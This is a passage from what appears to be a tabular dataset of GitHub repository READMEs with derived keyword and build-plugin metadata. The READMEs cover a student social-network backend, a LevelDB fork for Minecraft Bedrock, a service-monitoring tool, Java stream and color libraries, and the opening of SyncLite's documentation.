'file', 'ensure', 'file', 'directory', 'correct', 'build', 'project', 'usage', 'installing', 'necessary', 'component', 'run', 'application', 'main', 'function', 'start', 'frontend', 'interface', 'system', 'ready', 'accept', 'network', 'connection', 'client', 'device', 'contributing', 'contribute', 'project', 'submit', 'code', 'change', 'create', 'pull', 'request', 'wait', 'review', 'process', 'complete', 'license', 'project', 'licensed', 'apache', 'license', 'version', 'may', 'obtain', 'copy', 'license', 'http', 'unless', 'required', 'applicable', 'law', 'agreed', 'writing', 'software', 'distributed', 'license', 'distributed', 'basis', 'without', 'warranty', 'condition', 'kind', 'either', 'express', 'implied', 'see', 'license', 'specific', 'language', 'governing', 'permission', 'limitation', 'license']","['http', 'license', 'install', 'installation', 'system']",0,0,0,"['smart', 'autonomous', 'vehicle', 'management', 'system', 'table', 'content', 'installation', 'prerequisite', 'build', 'core', 'library', 'set', 'frontend', 'window', 'ubuntu', 'set', 'backend', 'usage', 'contribute', 'license']",12,"['set', 'smart', 'autonomous', 'vehicle', 'management']",11,0.0,1.0,"[org.apache.maven.plugins:maven-resources-plugin,org.codehaus.mojo:exec-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,3936,16.470588235294116,4.982142857142857,[],0
SE10-IJSE/SE10-NETWORK-BACKEND,main,"<a id=""readme-top""></a>

<!-- PROJECT LOGO -->
<br />
<div align=""center"">
  <a href=""https://github.com/SE10-IJSE/SE10-NETWORK-BACKEND"">
    <img src=""/src/main/resources/assets/SE10-Readme-Logo.png"" alt=""SE10 Logo"" width=""90"" height=""90"">
  </a>

<h2 align=""center"">SE10 NETWORK BACKEND</h2>

  <p align=""center"">
   Welcome to the <Strong>SE10 NETWORK</Strong> backend repository! This backend service powers a social media platform built specifically for students of <Strong>IJSE</Strong> (Institute of Software Engineering). The platform allows students to interact by creating and sharing posts, viewing posts by others, and receiving personalized notifications for special events like birthdays and campus-related events.
    <br />
    <a href=""https://github.com/SE10-IJSE/SE10-NETWORK-BACKEND/tree/main/src/main/java/lk/ijse/SE10_NETWORK_BACKEND""><strong>Explore the project »</strong></a>
    <br />
    <br />
    ·
    <a href=""https://github.com/SE10-IJSE/SE10-NETWORK-BACKEND/issues/new?labels=bug"">Report Bug</a>
    ·
    <a href=""https://github.com/SE10-IJSE/SE10-NETWORK-BACKEND/issues/new?labels=enhancement"">Request Feature</a>
    .
  </p>
</div>

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li>
      <a href=""#about-the-project"">About The Project</a>
      <ul>
        <li><a href=""#built-with"">Built With</a></li>
      </ul>
    </li>
    <li>
      <a href=""#getting-started"">Getting Started</a>
      <ul>
        <li><a href=""#prerequisites"">Prerequisites</a></li>
        <li><a href=""#installation"">Installation</a></li>
      </ul>
    </li>
    <li>
      <a href=""#api-documentation"">API Documentation</a>
    </li>
    <li>
      <a href=""#frontend-repository"">Frontend Repository</a>
    </li>
    <li>
      <a href=""#top-contributors"">Top contributors</a>
    </li>
    <li><a href=""#license"">License</a></li>
  </ol>
</details>

<!-- ABOUT THE PROJECT -->

## About The Project

- **User Registration and Login**: Users can register and log into the platform.
- **Post Management**:
  - Users can create new posts to share their thoughts or updates with fellow students.
  - Users can view posts created by others, fostering social interaction.
  - Users can delete their own posts when needed.
  - Users can react posts.
- **Notifications**:
  - Users will be notified about upcoming events relevant to their academic life.
  - Birthday notifications to remind users of their fellow students' birthdays.

<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>

### Built With

This project was developed using a range of modern backend technologies and frameworks to ensure robust performance, scalability, and secure data handling.

[![SPRING](https://img.shields.io/badge/Spring_Framework-black?style=for-the-badge&logo=spring&logoColor=green)](https://spring.io/projects/spring-framework)

[![SPRING DATA JPA](https://img.shields.io/badge/Spring_Data_JPA-black?style=for-the-badge&logo=spring&logoColor=green)](https://spring.io/projects/spring-data-jpa)

[![HIBERNATE](https://img.shields.io/badge/Hibernate-black?style=for-the-badge&logo=Hibernate&logoColor=BBAE79)](https://hibernate.org/orm/)

[![MAVEN](https://img.shields.io/badge/Maven-black?style=for-the-badge&logo=apachemaven&logoColor=C77361)](https://maven.apache.org/download.cgi)

[![MySQL](https://img.shields.io/badge/Mysql-black?style=for-the-badge&logo=mysql&logoColor=08668E"")](https://www.mysql.com/downloads/)

[![POSTMAN](https://img.shields.io/badge/Postman-black?style=for-the-badge&logo=Postman&logoColor=FF713D"")](https://www.postman.com/downloads/)

<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>

<!-- GETTING STARTED -->

## Getting Started

Follow these steps to set up the project locally and get it running on your machine. The instructions will guide you through the process of cloning the repository, installing dependencies, and configuring any required settings.

### Prerequisites

Before you begin, ensure you have the following installed on your system:

- **[Java 17](https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html)** or higher: Ensure you have JDK installed and configured on your system to compile and run application.
- **[MySQL](https://dev.mysql.com/downloads/)**: Ensure you have MySQL installed and running locally or remotely.
- **[Maven](https://mvnrepository.com/)**: Used for dependency management and building the project.
- **[Postman](https://www.postman.com/downloads/)** or any API client to test the API (optional, but recommended).

### Installation

Follow these steps to install and set up the project on your local machine:

1. **Clone the repository**

   ```sh
   git clone https://github.com/SE10-IJSE/SE10-NETWORK-BACKEND.git
   ```

2. Change git remote url to avoid accidental pushes to base project
   ```sh
   git remote set-url origin github_username/repo_name
   git remote -v # confirm the changes
   ```

<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>

## API Documentation

Refer to the [Postman API Documentation](https://documenter.getpostman.com/view/39303999/2sAY4sjQPn) for detailed API endpoints and usage instructions.

## Frontend Repository

Access the frontend repository on GitHub [here](https://github.com/SE10-IJSE/SE10-NETWORK-FRONTEND).

<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>

## Top contributors:

<a href=""https://github.com/SE10-IJSE/SE10-NETWORK-BACKEND/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=SE10-IJSE/SE10-NETWORK-BACKEND"" alt=""contrib.rocks image"" />
</a>

<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>

<!-- LICENSE -->

## License

Distributed under the MIT License. See [LICENSE](LICENSE) for more information.

<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>

##

<p align=""center"">
  &copy; 2024 SE10 NETWORK
</p>
",1,0,11,mit,23.0,"['project', 'user', 'registration', 'login', 'user', 'register', 'log', 'platform', 'post', 'management', 'user', 'create', 'new', 'post', 'share', 'thought', 'update', 'fellow', 'student', 'user', 'view', 'post', 'created', 'others', 'fostering', 'social', 'interaction', 'user', 'delete', 'post', 'needed', 'user', 'react', 'post', 'notification', 'user', 'notified', 'upcoming', 'event', 'relevant', 'academic', 'life', 'birthday', 'notification', 'remind', 'user', 'fellow', 'student', 'birthday', 'built', 'project', 'developed', 'using', 'range', 'modern', 'backend', 'technology', 'framework', 'ensure', 'robust', 'performance', 'scalability', 'secure', 'data', 'handling', 'getting', 'started', 'follow', 'step', 'set', 'project', 'locally', 'get', 'running', 'machine', 'instruction', 'guide', 'process', 'cloning', 'repository', 'installing', 'dependency', 'configuring', 'required', 'setting', 'prerequisite', 'begin', 'ensure', 'following', 'installed', 'system', 'java', 'higher', 'ensure', 'jdk', 'installed', 'configured', 'system', 'compile', 'run', 'application', 'mysql', 'ensure', 'mysql', 'installed', 'running', 'locally', 'remotely', 'maven', 'used', 'dependency', 'management', 'building', 'project', 'postman', 'api', 'client', 'test', 'api', 'optional', 'recommended', 'installation', 'follow', 'step', 'install', 'set', 'project', 'local', 'machine', 'clone', 'repository', 'change', 'git', 'remote', 'url', 'avoid', 'accidental', 'push', 'base', 'project', 'api', 'documentation', 'refer', 'postman', 'api', 'documentation', 'detailed', 'api', 'endpoint', 'usage', 'instruction', 'frontend', 'repository', 'access', 'frontend', 'repository', 'github', 'top', 'contributor', 'license', 'distributed', 'mit', 'license', 'see', 'license', 'information']","['user', 'project', 'post', 'api', 'ensure']",0,0,0,"['about', 'the', 'project', 'build', 'with', 'get', 'start', 'prerequisite', 'installation', 'confirm', 'change', 'api', 'documentation', 'frontend', 'repository', 'top', 'contributor', 'license']",10,"['about', 'the', 'project', 'build', 'with']",2,0.0,1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0,5896,27.193548387096776,4.943060498220641,"['![SPRING -> https://img.shields.io/badge/Spring_Framework-black?style=for-the-badge&logo=spring&logoColor=green', '![SPRING DATA JPA -> https://img.shields.io/badge/Spring_Data_JPA-black?style=for-the-badge&logo=spring&logoColor=green', '![HIBERNATE -> https://img.shields.io/badge/Hibernate-black?style=for-the-badge&logo=Hibernate&logoColor=BBAE79', '![MAVEN -> https://img.shields.io/badge/Maven-black?style=for-the-badge&logo=apachemaven&logoColor=C77361', '![MySQL -> https://img.shields.io/badge/Mysql-black?style=for-the-badge&logo=mysql&logoColor=08668E""', '![POSTMAN -> https://img.shields.io/badge/Postman-black?style=for-the-badge&logo=Postman&logoColor=FF713D""', 'Java 17 -> https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html', 'MySQL -> https://dev.mysql.com/downloads/', 'Maven -> https://mvnrepository.com/', 'Postman -> https://www.postman.com/downloads/', 'Postman API Documentation -> https://documenter.getpostman.com/view/39303999/2sAY4sjQPn', 'here -> https://github.com/SE10-IJSE/SE10-NETWORK-FRONTEND']",12
HiveGamesOSS/leveldb-mcpe-java,main,"# LevelDB MCPE in Java

This project is a fork of https://github.com/pcmind/leveldb aiming to implement the changes made
in https://github.com/Mojang/leveldb-mcpe/ where relevant to allow the library to read MCPE.

For more information see the original repository on use cases / API usage.

Building
--------

**Requirements**

- Git
- Java 11 or higher
- Maven

**Steps**

1. Clone this repository via `git clone git://github.com/HiveGamesOSS/leveldb-mcpe-java.git`.
2. Build the project via `mvn clean install`.
3. Obtain the library from `target/` folder.

Library Usage
--------

You can use the following in your maven pom.xml:

```xml

<dependency>
    <groupId>com.hivemc.leveldb</groupId>
    <artifactId>leveldb</artifactId>
    <version>1.0.0</version>
</dependency>
```

```xml

<dependency>
    <groupId>com.hivemc.leveldb</groupId>
    <artifactId>leveldb-api</artifactId>
    <version>1.0.0</version>
</dependency>
```

This library is aimed as a drop in replacement to the original fork https://github.com/pcmind/leveldb.

License
--------

Details of the LICENSE can be found in the license.txt, this fork maintains the original license for all code and
modifications.
",2,0,1,apache-2.0,0.0,"['leveldb', 'mcpe', 'java', 'project', 'fork', 'http', 'aiming', 'implement', 'change', 'made', 'http', 'relevant', 'allow', 'library', 'read', 'mcpe', 'information', 'see', 'original', 'repository', 'use', 'case', 'api', 'usage', 'building', 'requirements', 'git', 'java', 'higher', 'maven', 'step', 'clone', 'repository', 'via', 'build', 'project', 'via', 'obtain', 'library', 'folder', 'library', 'usage', 'use', 'following', 'maven', 'library', 'aimed', 'drop', 'replacement', 'original', 'fork', 'http', 'license', 'detail', 'license', 'found', 'fork', 'maintains', 'original', 'license', 'code', 'modification']","['library', 'fork', 'http', 'original', 'license']",0,0,0,"['leveldb', 'mcpe', 'java']",1,"['leveldb', 'mcpe', 'java']",2,254.0,5.0,"[maven-compiler-plugin,maven-shade-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.eluder.coveralls:coveralls-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,4.0,1.0,1185,17.4,4.919540229885057,[],0
JesusMiramontes/Heartbeatrr,main,"# Heartbeatrr Project - README

## Project Overview

Heartbeatrr is an easy-to-use service monitoring tool that helps you keep track of the health of your online services. Imagine you have a few websites, applications, or online services that you rely on, and you want to know if any of them go offline or experience issues. Heartbeatrr checks these services regularly and lets you know if something goes wrong.

### Here’s how it works:

1.	Service Health Monitoring: Heartbeatrr periodically checks the status of different services by “pinging” their URLs to see if they are responding. These services could be websites, APIs, or any other online system that provides a URL for checking availability.
2.	Automatic Alerts: If any of the services fail to respond or return an error, Heartbeatrr immediately sends a notification to your Discord channel. This way, you are promptly informed if something goes wrong without having to manually check everything.
3.	Configurable Timing: You can decide how often you want Heartbeatrr to check the services. For example, it could check them every 30 minutes, every hour, or at any interval that fits your needs. This is done through simple settings that are easy to adjust.
4.	Retry on Failure: Sometimes, services might be temporarily unavailable due to brief issues. Instead of notifying you immediately for every small hiccup, Heartbeatrr can retry the failed services a few times before sending an alert, just to make sure it’s not a short-term glitch.
5.	Customizable for Your Needs: You can easily tell Heartbeatrr which services to monitor by providing their URLs. It’s as simple as giving the app a list of web addresses, and it takes care of the rest.

## Who is it for?

Heartbeatrr is ideal for anyone who manages online services and wants to make sure everything is running smoothly without constantly checking manually. Whether you’re managing a few websites, APIs, or internal tools, Heartbeatrr gives you peace of mind by automatically checking the status of these services and notifying you of any issues.

This app is also great for those who use platforms like Discord for team communication. Instead of getting notifications via email or other channels, you’ll receive real-time alerts directly in your Discord chat, where you can quickly take action.

This simple yet powerful tool automates the health-checking process and keeps you informed, making it an essential part of your service management toolkit.

## Features
	- Periodic health checks for multiple services.
	- Configurable retries for failed health checks.
	- Sends alerts via Discord webhook when a service goes down.
	- Easily deployable using Docker.

## Docker Configuration
The project can be easily deployed using Docker. You need to configure the Docker environment variables to suit your needs. Here’s a breakdown of the variables you need to configure.

### Environment Variables

	- HEARTBEATRR_CONNECTION_TIMEOUT: Sets the HTTP connection timeout (in milliseconds). This determines how long the system waits for a service to respond before timing out. Example: 3000 (3 seconds).
	- HEARTBEATRR_RETRY_BACKOFF_DELAY: The delay (in milliseconds) between retry attempts when a health check fails. Example: 1000 (1 second).
	- HEARTBEATRR_RETRY_MAX_ATTEMPTS: Sets the maximum number of retry attempts for failed health checks. Example: 3.
	- HEARTBEATRR_HEALTHCHECK_SCHEDULE_DELAY: Delay between scheduled health checks (in seconds). This is how often the system will check the health of services. Example: 1800 (30 minutes).
	- HEARTBEATRR_SERVICES_URLS: A JSON-like object specifying the services to be checked and their URLs. For example: {""Google"":""http://google.com"", ""Yahoo"":""http://yahoo.com""}.
	- HEARTBEATRR_DISCORD_SERVICE_WEBHOOK: The Discord webhook URL to send notifications when services are down. This is required if you want to receive alerts.

## Steps to Run with Docker
1. Configure the docker-compose.yml file with the required services, retries, and Discord webhook.
2. Run the application with Docker Compose:
```bash
docker-compose up -d
```
3. The application will now start running and periodically check the services you’ve configured. If any service is down, you’ll receive a Discord notification.


## For Developers
This section is for developers who want to modify the code, run tests, or contribute to the project.

### Project Structure

The project follows a standard Spring Boot structure:

	• src/main/java: Contains the application source code.
	• src/main/resources: Contains application configuration files.
	• src/test/java: Contains unit and integration tests.

### Building the Project
Make sure you have Maven installed. To build the project:

### Contributing

We welcome contributions to the project! Here’s how you can contribute:

	1. Fork the repository.
	2. Create a new branch with a descriptive name (git checkout -b feature-branch-name).
	3. Make your changes and test them.
	4. Push your changes to the branch (git push origin feature-branch-name).
	5. Open a Pull Request and describe your changes.

Be sure to follow our coding standards and add proper documentation for any new features.

That’s it! If you have any questions, feel free to open an issue or reach out for support. Happy monitoring!",0,0,1,apache-2.0,0.0,"['heartbeatrr', 'project', 'readme', 'project', 'overview', 'heartbeatrr', 'service', 'monitoring', 'tool', 'help', 'keep', 'track', 'health', 'online', 'service', 'imagine', 'website', 'application', 'online', 'service', 'rely', 'want', 'know', 'go', 'offline', 'experience', 'issue', 'heartbeatrr', 'check', 'service', 'regularly', 'let', 'know', 'something', 'go', 'wrong', 'work', 'service', 'health', 'monitoring', 'heartbeatrr', 'periodically', 'check', 'status', 'different', 'service', 'pinging', 'url', 'see', 'responding', 'service', 'could', 'website', 'apis', 'online', 'system', 'provides', 'url', 'checking', 'availability', 'automatic', 'alert', 'service', 'fail', 'respond', 'return', 'error', 'heartbeatrr', 'immediately', 'sends', 'notification', 'discord', 'channel', 'way', 'promptly', 'informed', 'something', 'go', 'wrong', 'without', 'manually', 'check', 'everything', 'configurable', 'timing', 'decide', 'often', 'want', 'heartbeatrr', 'check', 'service', 'example', 'could', 'check', 'every', 'minute', 'every', 'hour', 'interval', 'fit', 'need', 'done', 'simple', 'setting', 'easy', 'adjust', 'retry', 'failure', 'sometimes', 'service', 'might', 'temporarily', 'unavailable', 'due', 'brief', 'issue', 'instead', 'notifying', 'immediately', 'every', 'small', 'hiccup', 'heartbeatrr', 'retry', 'failed', 'service', 'time', 'sending', 'alert', 'make', 'sure', 'glitch', 'customizable', 'need', 'easily', 'tell', 'heartbeatrr', 'service', 'monitor', 'providing', 'url', 'simple', 'giving', 'app', 'list', 'web', 'address', 'take', 'care', 'rest', 'heartbeatrr', 'ideal', 'anyone', 'manages', 'online', 'service', 'want', 'make', 'sure', 'everything', 'running', 'smoothly', 'without', 'constantly', 'checking', 'manually', 'whether', 'managing', 'website', 'apis', 'internal', 'tool', 'heartbeatrr', 'give', 'peace', 'mind', 'automatically', 'checking', 'status', 'service', 'notifying', 'issue', 'app', 'also', 'great', 'use', 'platform', 'like', 'discord', 'team', 'communication', 'instead', 'getting', 'notification', 'via', 'email', 'channel', 'receive', 'alert', 'directly', 'discord', 'chat', 'quickly', 'take', 'action', 'simple', 'yet', 'powerful', 'tool', 'automates', 'process', 'keep', 'informed', 'making', 'essential', 'part', 'service', 'management', 'toolkit', 'feature', 'docker', 'configuration', 'project', 'easily', 'deployed', 'using', 'docker', 'need', 'configure', 'docker', 'environment', 'variable', 'suit', 'need', 'breakdown', 'variable', 'need', 'configure', 'environment', 'variables', 'step', 'run', 'docker', 'configure', 'file', 'required', 'service', 'retries', 'discord', 'webhook', 'run', 'application', 'docker', 'compose', 'application', 'start', 'running', 'periodically', 'check', 'service', 'configured', 'service', 'receive', 'discord', 'notification', 'developer', 'section', 'developer', 'want', 'modify', 'code', 'run', 'test', 'contribute', 'project', 'project', 'structure', 'project', 'follows', 'standard', 'spring', 'boot', 'structure', 'building', 'project', 'make', 'sure', 'maven', 'installed', 'build', 'project', 'contributing', 'welcome', 'contribution', 'project', 'contribute', 'sure', 'follow', 'coding', 'standard', 'add', 'proper', 'documentation', 'new', 'feature', 'question', 'feel', 'free', 'open', 'issue', 'reach', 'support', 'happy', 'monitoring']","['service', 'heartbeatrr', 'project', 'check', 'discord']",6,0,0,"['heartbeatrr', 'project', 'readme', 'project', 'overview', 'here', 's', 'work', 'who', 'for', 'feature', 'docker', 'configuration', 'environment', 'variable', 'step', 'run', 'docker', 'for', 'developer', 'project', 'structure', 'building', 'project', 'contribute']",12,"['project', 'for', 'docker', 'heartbeatrr', 'readme']",1,0.0,1.0,"[com.diffplug.spotless:spotless-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,5284,11.305555555555555,5.156019656019656,[],0
pivovarit/more-gatherers,main,"# more-gatherers

Missing Stream API functionality you always longed for - provided via `Gatherers`

[![build](https://github.com/pivovarit/more-gatherers/actions/workflows/build.yml/badge.svg?branch=main)](https://github.com/pivovarit/more-gatherers/actions/workflows/build.yml)
[![pitest](https://github.com/pivovarit/more-gatherers/actions/workflows/pitest.yml/badge.svg?branch=main)](https://pivovarit.github.io/more-gatherers)
![Maven Central Version](https://img.shields.io/maven-central/v/com.pivovarit/more-gatherers)

[![Stargazers over time](https://starchart.cc/pivovarit/more-gatherers.svg?variant=adaptive)](https://starchart.cc/pivovarit/more-gatherers)

## Project is under intense development and will be released alongside Java 24, when Stream Gatherers go GA (hopefully)

### Overview

Java's Stream API is a powerful tool for processing collections of data. However, it lacks some functionality that could make it even more powerful. This library aims to fill that gap by providing a set of `Gatherers` that can be used to collect data from a stream more flexibly.

Whenever possible, the library follows Project Reactor's naming conventions.

Provided `Gatherers`:
- `MoreGatherers.last(int)`
  - takes last `n` elements from the stream
- `MoreGatherers.sampling(int)`
  - takes every `n`-th element from the stream
- `MoreGatherers.zip(Iterator<T2>)`
  - zips `Stream` elements with elements from the provided `Iterator`
- `MoreGatherers.zip(Iterator<T2>, BiFunction<T1,T2>)`
  - zips `Stream` elements with elements from the provided `Iterator` using a custom zipper function
- `MoreGatherers.zip(Stream<T2>)`
  - zips `Stream` elements with elements from the provided `Stream`
- `MoreGatherers.zip(Stream<T2>, BiFunction<T1,T2>)`
  - zips `Stream` elements with elements from the provided `Stream` using a custom zipper function
- `MoreGatherers.zipWithIterable(Iterable<T2>)`
  - zips `Stream` elements with elements from the provided `Iterable`
- `MoreGatherers.zipWithIterable(Iterable<T2>, BiFunction<T1,T2>)`
  - zips elements with elements from the provided `Iterable` using a custom zipper function
- `MoreGatherers.zipWithIndex()`
  - zips `Stream` elements with their index
- `MoreGatherers.zipWithIndex(BiFunction<Long,T>)`
  - zips `Stream` elements with their index using a custom zipper function
- `MoreGatherers.distinctBy(Function<T, R>)`
  - takes distinct elements based on a key extractor function
- `MoreGatherers.distinctByKeepLast(Function<T, R>)`
  - takes distinct elements based on a key extractor function, keeping the last occurrence
- `MoreGatherers.distinctUntilChanged()`
  - takes elements until a change is detected
- `MoreGatherers.distinctUntilChanged(Function<T, R>)`
  - takes elements until a change is detected based on a key extractor function
- `MoreGatherers.windowSliding(int, int)`
  - creates a sliding window of a fixed size with a fixed step, extends `Gatherers.windowSliding(int)` by adding a step parameter
- `MoreGatherers.byIndex(BiPredicate<Long, T>)`
  - filters elements based on their index and value

### Philosophy

The primary goal of this library is to complement the existing Stream API by providing functionality that's currently missing without duplicating features already available. While it is technically possible to create numerous custom Gatherers, this library focuses on offering only those that cannot be easily achieved using standard Stream API operations.

The library is designed to be as lightweight as possible, with no external dependencies. It's implemented using core Java libraries and follows the same conventions as the standard Stream API, drawing inspiration from Project Reactor's method names.
",0,0,3,apache-2.0,62.0,"['missing', 'stream', 'api', 'functionality', 'always', 'longed', 'provided', 'via', 'project', 'intense', 'development', 'released', 'alongside', 'java', 'stream', 'gatherer', 'go', 'ga', 'hopefully', 'overview', 'java', 'stream', 'api', 'powerful', 'tool', 'processing', 'collection', 'data', 'however', 'lack', 'functionality', 'could', 'make', 'even', 'powerful', 'library', 'aim', 'fill', 'gap', 'providing', 'set', 'used', 'collect', 'data', 'stream', 'flexibly', 'whenever', 'possible', 'library', 'follows', 'project', 'reactor', 'naming', 'convention', 'provided', 'take', 'last', 'element', 'stream', 'take', 'every', 'element', 'stream', 'zip', 'element', 'element', 'provided', 'zip', 'element', 'element', 'provided', 'using', 'custom', 'zipper', 'function', 'zip', 'element', 'element', 'provided', 'zip', 'element', 'element', 'provided', 'using', 'custom', 'zipper', 'function', 'zip', 'element', 'element', 'provided', 'zip', 'element', 'element', 'provided', 'using', 'custom', 'zipper', 'function', 'zip', 'element', 'index', 'zip', 'element', 'index', 'using', 'custom', 'zipper', 'function', 'take', 'distinct', 'element', 'based', 'key', 'extractor', 'function', 'take', 'distinct', 'element', 'based', 'key', 'extractor', 'function', 'keeping', 'last', 'occurrence', 'take', 'element', 'change', 'detected', 'take', 'element', 'change', 'detected', 'based', 'key', 'extractor', 'function', 'creates', 'sliding', 'window', 'fixed', 'size', 'fixed', 'step', 'extends', 'adding', 'step', 'parameter', 'filter', 'element', 'based', 'index', 'value', 'philosophy', 'primary', 'goal', 'library', 'complement', 'existing', 'stream', 'api', 'providing', 'functionality', 'currently', 'missing', 'without', 'duplicating', 'feature', 'already', 'available', 'technically', 'possible', 'create', 'numerous', 'custom', 'gatherer', 'library', 'focus', 'offering', 'easily', 'achieved', 'using', 'standard', 'stream', 'api', 'operation', 'library', 'designed', 'lightweight', 'possible', 'external', 'dependency', 'implemented', 'using', 'core', 'java', 'library', 'follows', 'convention', 'standard', 'stream', 'api', 'drawing', 'inspiration', 'project', 'reactor', 'method', 'name']","['element', 'stream', 'provided', 'zip', 'function']",0,0,0,"['project', 'intense', 'development', 'release', 'alongside', 'java', 'stream', 'gatherer', 'go', 'ga', 'hopefully', 'overview', 'philosophy']",4,"['project', 'intense', 'development', 'release', 'alongside']",0,68.0,1.0,"[maven-surefire-plugin,org.apache.felix:maven-bundle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.codehaus.mojo:exec-maven-plugin,org.pitest:pitest-maven,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0,3702,42.25,5.727810650887574,"['![build -> https://github.com/pivovarit/more-gatherers/actions/workflows/build.yml/badge.svg?branch=main', '![pitest -> https://github.com/pivovarit/more-gatherers/actions/workflows/pitest.yml/badge.svg?branch=main', 'Maven Central Version -> https://img.shields.io/maven-central/v/com.pivovarit/more-gatherers', '![Stargazers over time -> https://starchart.cc/pivovarit/more-gatherers.svg?variant=adaptive']",4
bowbahdoe/color,main,"# color

Color library for the JVM.

Heavily based on [go-colorful](https://github.com/lucasb-eyer/go-colorful/tree/master)
by [Lucas Beyer](https://github.com/lucasb-eyer).

```xml
<dependency>
    <groupId>dev.mccue</groupId>
    <artifactId>color</artifactId>
    <version>2024.10.09.3</version>
</dependency>
```

## Status

I am still working through this and working toward actually understanding
colors, color spaces, etc.

As such I might revisit some design choices without mercy. Notably I need to zero in
on where and when is best to auto-clamp values in the different color implementations.

Keep that in mind if you want to use it for anything. You can always reach out
to me directly to make sure some particular piece of API surface is stable.

Other than that, I need to do a lot more documentation. Both javadocs and
tutorials for appropriate usage.

## Usage

You can create a color using one of the static factory methods on `Color`.

```java
var red = Color.sRGB(1, 0, 0);
var blue = Color.hex(""#0000FF"");
```

And you can get the components of a color in a particular color space using matching instance methods.

```java
// RGB in 0..1
var srgb = Color.hex(""#00FF0F"").sRGB();
// RBG in 0..255
var rgb = Color.hex(""#00FF0F"").RGB255();
// HSL
var hsl = Color.hex(""#00FF0F"").HSL();
```

To blend between different colors you can use the various blend methods.
These are tailored to blending in a particular color space.

```java
var red = Color.sRGB(1, 0, 0);
var blue = Color.hex(""#0000FF"");
var purple = red.blendLuv(blue);
```

There are also utilities for generating palettes of colors
and for sorting colors by their ""distance"" to each-other.

```java
var happy = Color.happy(10);
var sorted = Color.sort(happy);
```

",6,0,1,mit,0.0,"['color', 'color', 'library', 'jvm', 'heavily', 'based', 'lucas', 'beyer', 'status', 'still', 'working', 'working', 'toward', 'actually', 'understanding', 'color', 'color', 'space', 'etc', 'might', 'revisit', 'design', 'choice', 'without', 'mercy', 'notably', 'need', 'zero', 'best', 'value', 'different', 'color', 'implementation', 'keep', 'mind', 'want', 'use', 'anything', 'always', 'reach', 'directly', 'make', 'sure', 'particular', 'piece', 'api', 'surface', 'stable', 'need', 'lot', 'documentation', 'javadocs', 'tutorial', 'appropriate', 'usage', 'usage', 'create', 'color', 'using', 'one', 'static', 'factory', 'method', 'get', 'component', 'color', 'particular', 'color', 'space', 'using', 'matching', 'instance', 'method', 'blend', 'different', 'color', 'use', 'various', 'blend', 'method', 'tailored', 'blending', 'particular', 'color', 'space', 'also', 'utility', 'generating', 'palette', 'color', 'sorting', 'color', 'distance']","['color', 'space', 'particular', 'method', 'working']",0,0,0,"['color', 'status', 'usage']",3,"['color', 'status', 'usage']",5,32.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jreleaser:jreleaser-maven-plugin]",0.0,1.0,0.0,1742,18.933333333333334,4.450704225352113,"['go-colorful -> https://github.com/lucasb-eyer/go-colorful/tree/master', 'Lucas Beyer -> https://github.com/lucasb-eyer']",2
syncliteio/SyncLite,main,"
<p align=""center"">
  <a href=""https://www.synclite.io"">
  <img src=""docs/images/SyncLite_logo.png"" alt=""SyncLite - Build Anything Sync Anywhere"">
  </a>
  <p align=""center"">
    <a href=""https://www.synclite.io"">Learn more</a>
    ·
    <a href=""https://join.slack.com/t/syncliteworkspace/shared_invite/zt-2pz945vva-uuKapsubC9Mu~uYDRKo6Jw"">Chat on Slack</a>
  </p>
</p>

# SyncLite - Build Anything Sync Anywhere

<a href=https://www.synclite.io>SyncLite</a> is an open-source, low-code, comprehensive relational data consolidation platform enabling developers to rapidly build data intensive applications for edge, desktop and mobile environments. SyncLite enables real-time, transactional data replication and consolidation from various sources including edge/desktop applications using popular embedded databases (SQLite, DuckDB, Apache Derby, H2, HyperSQL), data streaming applications, IoT message brokers, traditional database systems(ETL) and more into a diverse array of databases, data warehouses, and data lakes, enabling AI and ML use-cases at edge and cloud.

<p align=""center"">
  <a href=""https://www.synclite.io"">
  <img src=""docs/images/SyncLite_Overview.png"" width=""80%"" height=""80%"" alt=""SyncLite - Build Anything Sync Anywhere"">
  </a>
</p>

SyncLite enables following scenarios for industry leading databases, data warehouse and data lakes.

## Build Sync-Ready Applications: 
SyncLite provides a novel CDC replication framework for embedded databases, helping developers quickly build data-intensive applications, including Gen AI Search and RAG applications, for edge, desktop, and mobile environments. It integrates seamlessly with popular embedded databases like SQLite, DuckDB, Apache Derby, H2, and HyperSQL (HSQLDB), enabling Change Data Capture (CDC), transactional, real-time data replication, and consolidation into industry-leading databases, data warehouses, and data lakes. 

```SyncLite Logger```, an embeddable Java library (JDBC driver), that can be consumed by Java and Python applications for efficient data syncing by capturing all SQL transactions in log files and shipping these log files to configured staging storages.

